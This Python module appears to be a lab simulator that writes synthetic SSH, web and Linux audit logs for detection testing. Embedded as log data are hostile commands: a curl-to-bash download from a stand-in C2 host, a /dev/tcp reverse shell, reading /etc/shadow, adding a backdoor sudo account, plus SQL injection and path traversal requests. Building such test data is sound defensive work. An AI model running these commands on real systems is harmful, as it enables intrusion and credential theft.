"""Atomic-style controlled attack simulator generating synthetic SSH, Web, and Linux Audit logs.

Safety: This module ONLY writes synthetic log lines to disk. It never performs real
network scans, exploitation, or host modifications. All public IPs belong to RFC 5737
test ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24).
"""

from __future__ import annotations

import json
from datetime import UTC, datetime, timedelta
from pathlib import Path

SCENARIOS = ("ssh_compromise", "web_attacks", "linux_post_exploit")


def _fmt_syslog_ts(dt: datetime) -> str:
    return dt.strftime("%b %d %H:%M:%S")


def _fmt_web_ts(dt: datetime) -> str:
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")


def build_ssh_logs(base_time: datetime, *, include_attack: bool, include_benign: bool) -> list[str]:
    """Generate synthetic sshd syslog telemetry (benign admin logins + brute force -> compromise)."""
    lines: list[str] = []

    if include_benign:
        benign_events = [
            (0, "Accepted publickey for alice from 10.0.1.15 port 50120 ssh2"),
            (18, "Failed password for bob from 10.0.1.22 port 50411 ssh2"),
            (25, "Accepted password for bob from 10.0.1.22 port 50412 ssh2"),
            (40, "Accepted publickey for ci-runner from 10.0.2.50 port 51001 ssh2"),
        ]
        for offset, msg in benign_events:
            ts = _fmt_syslog_ts(base_time + timedelta(seconds=offset))
            lines.append(f"{ts} web-prod-01 sshd[4100]: {msg}")

    if include_attack:
        attacker_ip = "198.51.100.77"  # RFC 5737 test IP present in local TI feed
        attempted_users = ["root", "admin", "ubuntu", "postgres", "deploy", "deploy", "deploy"]
        for idx, user in enumerate(attempted_users):
            ts = _fmt_syslog_ts(base_time + timedelta(seconds=60 + idx * 8))
            inv = "invalid user " if user in {"admin", "ubuntu", "postgres"} else ""
            lines.append(
                f"{ts} web-prod-01 sshd[{4200 + idx}]: "
                f"Failed password for {inv}{user} from {attacker_ip} port {52100 + idx} ssh2"
            )
        # Successful compromise 15 seconds after the brute-force burst
        compromise_ts = _fmt_syslog_ts(base_time + timedelta(seconds=135))
        lines.append(
            f"{compromise_ts} web-prod-01 sshd[4299]: "
            f"Accepted password for deploy from {attacker_ip} port 52199 ssh2"
        )

    return lines


def build_web_logs(base_time: datetime, *, include_attack: bool, include_benign: bool) -> list[str]:
    """Generate synthetic Nginx combined access logs (normal traffic + SQLi, traversal, recon)."""
    lines: list[str] = []

    if include_benign:
        benign_requests = [
            (5, "10.0.5.12", "GET", "/", 200, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
            (12, "10.0.5.12", "GET", "/api/v1/products?category=books", 200, "Mozilla/5.0"),
            (22, "10.0.5.19", "POST", "/api/v1/auth/login", 200, "Mozilla/5.0"),
            (30, "10.0.0.2", "GET", "/health?check=union+select", 200, "kube-probe/1.30"),
            (45, "10.0.5.25", "GET", "/static/app.js", 200, "Mozilla/5.0"),
        ]
        for offset, ip, method, url, status, ua in benign_requests:
            ts = _fmt_web_ts(base_time + timedelta(seconds=offset))
            lines.append(f'{ip} - - [{ts}] "{method} {url} HTTP/1.1" {status} 1024 "-" "{ua}"')

    if include_attack:
        scanner_ip = "203.0.113.45"  # RFC 5737 test IP present in local TI feed
        attack_requests = [
            # Sensitive file discovery (T1595.003)
            (70, "GET", "/.env", 404, "python-requests/2.32.0"),
            (74, "GET", "/.git/config", 404, "python-requests/2.32.0"),
            (78, "GET", "/backup.sql", 404, "python-requests/2.32.0"),
            (82, "GET", "/wp-login.php", 404, "python-requests/2.32.0"),
            # SQL Injection probes (T1190)
            (95, "GET", "/api/v1/users?id=1%27%20OR%20%271%27=%271", 400, "sqlmap/1.8"),
            (
                102,
                "GET",
                "/api/v1/orders?id=1+UNION+SELECT+username,password+FROM+users--",
                500,
                "sqlmap/1.8",
            ),
            # Path Traversal (T1190)
            (115, "GET", "/download?file=../../../../etc/passwd", 403, "curl/8.7.1"),
        ]
        for offset, method, url, status, ua in attack_requests:
            ts = _fmt_web_ts(base_time + timedelta(seconds=offset))
            lines.append(f'{scanner_ip} - - [{ts}] "{method} {url} HTTP/1.1" {status} 312 "-" "{ua}"')

    return lines


def build_linux_audit_logs(
    base_time: datetime, *, include_attack: bool, include_benign: bool
) -> list[str]:
    """Generate synthetic Linux process execution audit logs in JSONL format."""
    records: list[dict[str, object]] = []

    if include_benign:
        benign_procs = [
            (10, "alice", "10.0.1.15", "ls", "ls -la /var/www/html", 3101),
            (
                20,
                "backup_agent",
                "10.0.2.10",
                "tar",
                "tar -czf /var/backups/etc.tgz /etc/shadow",
                3102,
            ),
            (
                35,
                "ansible_provisioner",
                "10.0.2.20",
                "useradd",
                "useradd -m -s /bin/bash dev_intern",
                3103,
            ),
            (50, "ci-runner", "10.0.2.50", "systemctl", "systemctl status nginx", 3104),
        ]
        for offset, user, src_ip, proc, cmd, pid in benign_procs:
            records.append(
                {
                    "timestamp": (base_time + timedelta(seconds=offset)).isoformat(),
                    "host": "web-prod-01",
                    "user": user,
                    "source_ip": src_ip,
                    "process": proc,
                    "command_line": cmd,
                    "pid": pid,
                }
            )

    if include_attack:
        # Post-exploitation chain following compromised 'deploy' account from 198.51.100.77
        attack_procs = [
            (
                150,
                "deploy",
                "198.51.100.77",
                "bash",
                "bash -c 'curl -fsSL http://c2.malicious-lab.example/stage.sh | bash'",
                4810,
            ),
            (
                165,
                "deploy",
                "198.51.100.77",
                "bash",
                "bash -i >& /dev/tcp/192.0.2.99/4444 0>&1",
                4815,
            ),
            (
                185,
                "deploy",
                "198.51.100.77",
                "cat",
                "cat /etc/shadow",
                4822,
            ),
            (
                205,
                "root",
                "198.51.100.77",
                "useradd",
                "useradd -m -s /bin/bash svc_backup_tmp && usermod -aG sudo svc_backup_tmp",
                4830,
            ),
        ]
        for offset, user, src_ip, proc, cmd, pid in attack_procs:
            records.append(
                {
                    "timestamp": (base_time + timedelta(seconds=offset)).isoformat(),
                    "host": "web-prod-01",
                    "user": user,
                    "source_ip": src_ip,
                    "process": proc,
                    "command_line": cmd,
                    "pid": pid,
                }
            )

    return [json.dumps(rec) for rec in records]


def generate_lab_logs(
    output_dir: str | Path,
    *,
    scenario: str = "all",
    include_benign: bool = True,
    base_time: datetime | None = None,
) -> dict[str, Path]:
    """Write synthetic SSH, Web, and Linux Audit logs into `output_dir`."""
    if scenario != "all" and scenario not in SCENARIOS:
        raise ValueError(f"Unknown scenario: {scenario!r}. Choose 'all' or one of {SCENARIOS}.")

    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)
    start = base_time or datetime(2026, 11, 20, 14, 10, 0, tzinfo=UTC)

    ssh_lines = build_ssh_logs(
        start,
        include_attack=scenario in {"all", "ssh_compromise"},
        include_benign=include_benign,
    )
    web_lines = build_web_logs(
        start,
        include_attack=scenario in {"all", "web_attacks"},
        include_benign=include_benign,
    )
    audit_lines = build_linux_audit_logs(
        start,
        include_attack=scenario in {"all", "linux_post_exploit"},
        include_benign=include_benign,
    )

    ssh_path = out / "auth.log"
    web_path = out / "access.log"
    audit_path = out / "linux_audit.jsonl"

    ssh_path.write_text("\n".join(ssh_lines) + ("\n" if ssh_lines else ""), encoding="utf-8")
    web_path.write_text("\n".join(web_lines) + ("\n" if web_lines else ""), encoding="utf-8")
    audit_path.write_text("\n".join(audit_lines) + ("\n" if audit_lines else ""), encoding="utf-8")

    return {"sshd": ssh_path, "webserver": web_path, "linux_audit": audit_path}
